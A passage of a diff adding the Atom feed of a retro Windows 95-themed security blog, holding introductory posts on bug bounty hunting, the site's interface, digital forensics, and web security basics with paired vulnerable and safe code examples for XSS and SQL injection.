+<p>Remember: This demo is for educational purposes only. Always use your knowledge responsibly and only test on systems you own or have explicit permission to test.</p>]]></content><author><name>Blog Author</name><email>author@example.com</email></author><category term="bug-bounty" /><category term="web-security" /><summary type="html"><![CDATA[Learn about Cross-Site Scripting (XSS) attacks through an interactive demonstration.]]></summary></entry><entry><title type="html">Introduction to Bug Bounty</title><link href="http://localhost:4000/bug-bounty/general/2025/01/03/intro-bugbounty/" rel="alternate" type="text/html" title="Introduction to Bug Bounty" /><published>2025-01-03T11:00:00+00:00</published><updated>2025-01-03T11:00:00+00:00</updated><id>http://localhost:4000/bug-bounty/general/2025/01/03/intro-bugbounty</id><content type="html" xml:base="http://localhost:4000/bug-bounty/general/2025/01/03/intro-bugbounty/"><![CDATA[<h1 id="introduction-to-bug-bounty-hunting">Introduction to Bug Bounty Hunting</h1>
+
+<p>Welcome to the exciting world of bug bounty hunting! This guide will help you get started with finding security vulnerabilities in web applications and earning rewards for your discoveries.</p>
+
+<h2 id="what-is-bug-bounty">What is Bug Bounty?</h2>
+
+<p>Bug bounty programs are initiatives run by companies to encourage security researchers to find and report vulnerabilities in their systems. In return, researchers receive monetary rewards, recognition, and sometimes swag.</p>
+
+<h2 id="getting-started">Getting Started</h2>
+
+<ol>
+  <li><strong>Learn the Basics</strong>: Understand common web vulnerabilities like XSS, SQL injection, CSRF, etc.</li>
+  <li><strong>Practice</strong>: Use platforms like HackTheBox, TryHackMe, or DVWA</li>
+  <li><strong>Read Write-ups</strong>: Study how other researchers find vulnerabilities</li>
+  <li><strong>Start Small</strong>: Begin with smaller programs to build your reputation</li>
+</ol>
+
+<h2 id="common-vulnerabilities-to-look-for">Common Vulnerabilities to Look For</h2>
+
+<ul>
+  <li><strong>Cross-Site Scripting (XSS)</strong></li>
+  <li><strong>SQL Injection</strong></li>
+  <li><strong>Cross-Site Request Forgery (CSRF)</strong></li>
+  <li><strong>Authentication Bypass</strong></li>
+  <li><strong>Privilege Escalation</strong></li>
+  <li><strong>Information Disclosure</strong></li>
+</ul>
+
+<h2 id="tips-for-success">Tips for Success</h2>
+
+<ul>
+  <li>Always follow responsible disclosure practices</li>
+  <li>Document your findings thoroughly</li>
+  <li>Be patient and persistent</li>
+  <li>Learn from rejections</li>
+  <li>Network with other researchers</li>
+</ul>
+
+<p>Happy hunting!</p>]]></content><author><name>Blog Author</name><email>author@example.com</email></author><category term="bug-bounty" /><category term="general" /><summary type="html"><![CDATA[A beginner's guide to bug bounty hunting and cybersecurity.]]></summary></entry><entry><title type="html">Welcome to Windows 95 Blog</title><link href="http://localhost:4000/general/intro/2025/01/03/welcome/" rel="alternate" type="text/html" title="Welcome to Windows 95 Blog" /><published>2025-01-03T10:00:00+00:00</published><updated>2025-01-03T10:00:00+00:00</updated><id>http://localhost:4000/general/intro/2025/01/03/welcome</id><content type="html" xml:base="http://localhost:4000/general/intro/2025/01/03/welcome/"><![CDATA[<p>This is the first test post.</p>
+
+<p>Welcome to the Windows 95 Blog! This is a retro-style blog that brings back the nostalgic feeling of using Windows 95.</p>
+
+<h2 id="features">Features</h2>
+
+<ul>
+  <li><strong>Desktop Interface</strong>: Experience the classic Windows 95 desktop with icons, taskbar, and window management</li>
+  <li><strong>File Explorer</strong>: Browse blog posts as if they were files in a file system</li>
+  <li><strong>Command Line</strong>: Access a full command prompt with various commands</li>
+  <li><strong>Search</strong>: Find posts using the built-in search functionality</li>
+</ul>
+
+<h2 id="getting-started">Getting Started</h2>
+
+<ol>
+  <li>Double-click on the “File Explorer” icon to browse blog posts</li>
+  <li>Press the backtick key (`) to open the command line interface</li>
+  <li>Use the search bar in File Explorer to find specific posts</li>
+  <li>Double-click on any post to open it in a new window</li>
+</ol>
+
+<h2 id="commands-available">Commands Available</h2>
+
+<p>In the command prompt, you can use:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">help</code> - Show available commands</li>
+  <li><code class="language-plaintext highlighter-rouge">ls</code> - List all posts</li>
+  <li><code class="language-plaintext highlighter-rouge">cat &lt;title&gt;</code> - Display post content</li>
+  <li><code class="language-plaintext highlighter-rouge">open &lt;title&gt;</code> - Open post in new window</li>
+  <li><code class="language-plaintext highlighter-rouge">search &lt;term&gt;</code> - Search posts</li>
+  <li><code class="language-plaintext highlighter-rouge">echo &lt;text&gt;</code> - Display text</li>
+</ul>
+
+<p>Enjoy your retro computing experience!</p>]]></content><author><name>Blog Author</name><email>author@example.com</email></author><category term="general" /><category term="intro" /><summary type="html"><![CDATA[This is the first test post.]]></summary></entry><entry><title type="html">Introduction to Digital Forensics: The Art of Digital Investigation</title><link href="http://localhost:4000/penetration%20testing/forensics/2025/01/03/forensics-intro/" rel="alternate" type="text/html" title="Introduction to Digital Forensics: The Art of Digital Investigation" /><published>2025-01-03T00:00:00+00:00</published><updated>2025-01-03T00:00:00+00:00</updated><id>http://localhost:4000/penetration%20testing/forensics/2025/01/03/forensics-intro</id><content type="html" xml:base="http://localhost:4000/penetration%20testing/forensics/2025/01/03/forensics-intro/"><![CDATA[<h1 id="introduction-to-digital-forensics-the-art-of-digital-investigation">Introduction to Digital Forensics: The Art of Digital Investigation</h1>
+
+<p>Digital forensics is the science of collecting, analyzing, and preserving digital evidence to investigate cyber incidents and support legal proceedings. In this comprehensive guide, we’ll explore the essential concepts and methodologies.</p>
+
+<h2 id="what-is-digital-forensics">What is Digital Forensics?</h2>
+
+<p>Digital forensics involves the systematic examination of digital devices and data to uncover evidence of cybercrimes, security breaches, or other incidents. It’s a critical component of incident response and cybersecurity investigations.</p>
+
+<h2 id="the-digital-forensics-process">The Digital Forensics Process</h2>
+
+<h3 id="1-identification">1. Identification</h3>
+<p>The first step involves identifying potential sources of evidence:</p>
+<ul>
+  <li>Hard drives</li>
+  <li>Memory (RAM)</li>
+  <li>Network traffic</li>
+  <li>Mobile devices</li>
+  <li>Cloud storage</li>
+</ul>
+
+<h3 id="2-preservation">2. Preservation</h3>
+<p>Evidence must be preserved in its original state:</p>
+<ul>
+  <li>Create bit-by-bit copies (imaging)</li>
+  <li>Use write blockers</li>
+  <li>Document the chain of custody</li>
+  <li>Calculate hash values (MD5, SHA-256)</li>
+</ul>
+
+<h3 id="3-collection">3. Collection</h3>
+<p>Gathering evidence while maintaining integrity:</p>
+<ul>
+  <li>Physical evidence collection</li>
+  <li>Digital evidence acquisition</li>
+  <li>Network packet capture</li>
+  <li>Memory dumps</li>
+</ul>
+
+<h3 id="4-analysis">4. Analysis</h3>
+<p>Examine the collected evidence:</p>
+<ul>
+  <li>File system analysis</li>
+  <li>Memory analysis</li>
+  <li>Network analysis</li>
+  <li>Timeline analysis</li>
+</ul>
+
+<h3 id="5-documentation">5. Documentation</h3>
+<p>Record all findings and procedures:</p>
+<ul>
+  <li>Detailed reports</li>
+  <li>Evidence logs</li>
+  <li>Chain of custody documentation</li>
+  <li>Expert testimony preparation</li>
+</ul>
+
+<h2 id="types-of-digital-forensics">Types of Digital Forensics</h2>
+
+<h3 id="computer-forensics">Computer Forensics</h3>
+<ul>
+  <li>Hard drive analysis</li>
+  <li>Operating system artifacts</li>
+  <li>Application data examination</li>
+  <li>Deleted file recovery</li>
+</ul>
+
+<h3 id="memory-forensics">Memory Forensics</h3>
+<ul>
+  <li>RAM analysis</li>
+  <li>Process examination</li>
+  <li>Network connections</li>
+  <li>Malware detection</li>
+</ul>
+
+<h3 id="network-forensics">Network Forensics</h3>
+<ul>
+  <li>Packet capture analysis</li>
+  <li>Traffic pattern identification</li>
+  <li>Intrusion detection</li>
+  <li>Protocol analysis</li>
+</ul>
+
+<h3 id="mobile-forensics">Mobile Forensics</h3>
+<ul>
+  <li>Smartphone examination</li>
+  <li>App data analysis</li>
+  <li>GPS location data</li>
+  <li>Communication records</li>
+</ul>
+
+<h2 id="essential-tools">Essential Tools</h2>
+
+<h3 id="imaging-and-analysis">Imaging and Analysis</h3>
+<ul>
+  <li><strong>FTK Imager</strong>: Create forensic images</li>
+  <li><strong>Autopsy</strong>: Open-source digital forensics platform</li>
+  <li><strong>EnCase</strong>: Professional forensics software</li>
+  <li><strong>X-Ways Forensics</strong>: Advanced analysis tool</li>
+</ul>
+
+<h3 id="memory-analysis">Memory Analysis</h3>
+<ul>
+  <li><strong>Volatility</strong>: Memory forensics framework</li>
+  <li><strong>Rekall</strong>: Memory analysis platform</li>
+  <li><strong>WinPmem</strong>: Windows memory acquisition</li>
+</ul>
+
+<h3 id="network-analysis">Network Analysis</h3>
+<ul>
+  <li><strong>Wireshark</strong>: Network protocol analyzer</li>
+  <li><strong>NetworkMiner</strong>: Network forensics tool</li>
+  <li><strong>tcpdump</strong>: Command-line packet analyzer</li>
+</ul>
+
+<h2 id="common-artifacts">Common Artifacts</h2>
+
+<h3 id="windows-artifacts">Windows Artifacts</h3>
+<ul>
+  <li>Registry hives</li>
+  <li>Event logs</li>
+  <li>Prefetch files</li>
+  <li>Jump lists</li>
+  <li>Recycle bin</li>
+</ul>
+
+<h3 id="linux-artifacts">Linux Artifacts</h3>
+<ul>
+  <li>System logs</li>
+  <li>Bash history</li>
+  <li>Cron jobs</li>
+  <li>Package management logs</li>
+  <li>User activity logs</li>
+</ul>
+
+<h3 id="network-artifacts">Network Artifacts</h3>
+<ul>
+  <li>Firewall logs</li>
+  <li>IDS/IPS alerts</li>
+  <li>Proxy logs</li>
+  <li>DNS queries</li>
+  <li>Authentication logs</li>
+</ul>
+
+<h2 id="best-practices">Best Practices</h2>
+
+<h3 id="1-maintain-chain-of-custody">1. Maintain Chain of Custody</h3>
+<ul>
+  <li>Document every person who handles evidence</li>
+  <li>Use evidence bags and labels</li>
+  <li>Sign and date all documentation</li>
+</ul>
+
+<h3 id="2-never-work-on-original-evidence">2. Never Work on Original Evidence</h3>
+<ul>
+  <li>Always work with copies</li>
+  <li>Use write blockers</li>
+  <li>Verify integrity with hashes</li>
+</ul>
+
+<h3 id="3-document-everything">3. Document Everything</h3>
+<ul>
+  <li>Take detailed notes</li>
+  <li>Photograph evidence</li>
+  <li>Record all procedures</li>
+  <li>Maintain logs</li>
+</ul>
+
+<h3 id="4-stay-current">4. Stay Current</h3>
+<ul>
+  <li>Keep tools updated</li>
+  <li>Follow industry standards</li>
+  <li>Attend training and conferences</li>
+  <li>Join professional organizations</li>
+</ul>
+
+<h2 id="legal-considerations">Legal Considerations</h2>
+
+<h3 id="admissibility">Admissibility</h3>
+<ul>
+  <li>Evidence must be relevant</li>
+  <li>Maintain authenticity</li>
+  <li>Follow proper procedures</li>
+  <li>Expert testimony may be required</li>
+</ul>
+
+<h3 id="privacy">Privacy</h3>
+<ul>
+  <li>Respect privacy rights</li>
+  <li>Obtain proper authorization</li>
+  <li>Follow legal requirements</li>
+  <li>Handle sensitive data appropriately</li>
+</ul>
+
+<h2 id="incident-response-integration">Incident Response Integration</h2>
+
+<p>Digital forensics is closely integrated with incident response:</p>
+<ul>
+  <li>Rapid evidence collection</li>
+  <li>Live system analysis</li>
+  <li>Threat intelligence correlation</li>
+  <li>Malware analysis</li>
+  <li>Attack reconstruction</li>
+</ul>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>Digital forensics is a complex but essential discipline in cybersecurity. By following proper procedures and using appropriate tools, investigators can uncover valuable evidence and help bring cybercriminals to justice.</p>
+
+<p>Remember: The goal is not just to find evidence, but to present it in a way that’s admissible in court and understandable to stakeholders.</p>
+
+<hr />
+
+<p><em>This post is part of our Digital Forensics series. Stay tuned for more advanced topics including memory forensics, network forensics, and malware analysis.</em></p>]]></content><author><name>Blog Author</name><email>author@example.com</email></author><category term="Penetration Testing" /><category term="Forensics" /><category term="forensics" /><category term="investigation" /><category term="incident-response" /><category term="cybersecurity" /><summary type="html"><![CDATA[Discover the fundamentals of digital forensics and learn how to investigate cyber incidents effectively.]]></summary></entry><entry><title type="html">Web Security Basics: A Beginner’s Guide</title><link href="http://localhost:4000/general/web%20security/2025/01/03/web-security-basics/" rel="alternate" type="text/html" title="Web Security Basics: A Beginner’s Guide" /><published>2025-01-03T00:00:00+00:00</published><updated>2025-01-03T00:00:00+00:00</updated><id>http://localhost:4000/general/web%20security/2025/01/03/web-security-basics</id><content type="html" xml:base="http://localhost:4000/general/web%20security/2025/01/03/web-security-basics/"><![CDATA[<h1 id="web-security-basics-a-beginners-guide">Web Security Basics: A Beginner’s Guide</h1>
+
+<p>Web security is a critical aspect of modern application development. In this post, we’ll explore the fundamental concepts that every developer should understand.</p>
+
+<h2 id="what-is-web-security">What is Web Security?</h2>
+
+<p>Web security encompasses the protection of websites, web applications, and web services from various threats and vulnerabilities. It’s about ensuring that your application can’t be exploited by malicious actors.</p>
+
+<h2 id="common-web-vulnerabilities">Common Web Vulnerabilities</h2>
+
+<h3 id="1-cross-site-scripting-xss">1. Cross-Site Scripting (XSS)</h3>
+<p>XSS attacks occur when malicious scripts are injected into web pages viewed by other users. This can lead to:</p>
+<ul>
+  <li>Session hijacking</li>
+  <li>Data theft</li>
+  <li>Malicious redirects</li>
+</ul>
+
+<p><strong>Example of vulnerable code:</strong></p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// DON'T DO THIS</span>
+<span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">output</span><span class="dl">'</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">userInput</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p><strong>Safe alternative:</strong></p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// DO THIS INSTEAD</span>
+<span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">output</span><span class="dl">'</span><span class="p">).</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">userInput</span><span class="p">;</span>
+</code></pre></div></div>
+
+<h3 id="2-sql-injection">2. SQL Injection</h3>
+<p>SQL injection happens when user input is directly concatenated into SQL queries, allowing attackers to manipulate database operations.</p>
+
+<p><strong>Vulnerable code:</strong></p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT * FROM users WHERE id = "</span> <span class="mf">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>
+</code></pre></div></div>
+
+<p><strong>Safe code:</strong></p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="nf">prepare</span><span class="p">(</span><span class="s2">"SELECT * FROM users WHERE id = ?"</span><span class="p">);</span>
+<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">execute</span><span class="p">([</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]]);</span>
+</code></pre></div></div>
+
+<h3 id="3-cross-site-request-forgery-csrf">3. Cross-Site Request Forgery (CSRF)</h3>
+<p>CSRF attacks trick authenticated users into performing actions they didn’t intend to perform.</p>
+
+<h2 id="best-practices-for-web-security">Best Practices for Web Security</h2>
+
+<h3 id="1-input-validation">1. Input Validation</h3>
+<p>Always validate and sanitize user input before processing it.</p>
+
+<h3 id="2-output-encoding">2. Output Encoding</h3>
+<p>Encode output to prevent XSS attacks.</p>
+
+<h3 id="3-use-https">3. Use HTTPS</h3>
+<p>Always use HTTPS in production to encrypt data in transit.</p>
+
+<h3 id="4-implement-authentication-properly">4. Implement Authentication Properly</h3>
+<p>Use secure authentication mechanisms and never store passwords in plain text.</p>
+
+<h3 id="5-keep-dependencies-updated">5. Keep Dependencies Updated</h3>
+<p>Regularly update your dependencies to patch known vulnerabilities.</p>
+
+<h2 id="security-headers">Security Headers</h2>
+
+<p>Implement these security headers in your applications:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+X-XSS-Protection: 1; mode=block
+Content-Security-Policy: default-src 'self'
+</span></code></pre></div></div>
+
+<h2 id="tools-for-security-testing">Tools for Security Testing</h2>
+
+<ul>
+  <li><strong>OWASP ZAP</strong>: Free web application security scanner</li>
+  <li><strong>Burp Suite</strong>: Professional web application security testing platform</li>
+  <li><strong>Nikto</strong>: Web server scanner</li>
+  <li><strong>Nmap</strong>: Network discovery and security auditing</li>
+</ul>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>Web security is not optional—it’s essential. By understanding these basic concepts and implementing proper security measures, you can significantly reduce the risk of your applications being compromised.</p>
+
+<p>Remember: Security is a process, not a product. Stay informed about new threats and continuously improve your security practices.</p>
+
+<hr />
+
+<p><em>This post is part of our Web Security Basics series. Check out our other posts for more in-depth coverage of specific vulnerabilities and defense strategies.</em></p>]]></content><author><name>Blog Author</name><email>author@example.com</email></author><category term="General" /><category term="Web Security" /><category term="security" /><category term="web" /><category term="basics" /><category term="beginners" /><summary type="html"><![CDATA[Learn the fundamental concepts of web security and how to protect your applications from common vulnerabilities.]]></summary></entry></feed>
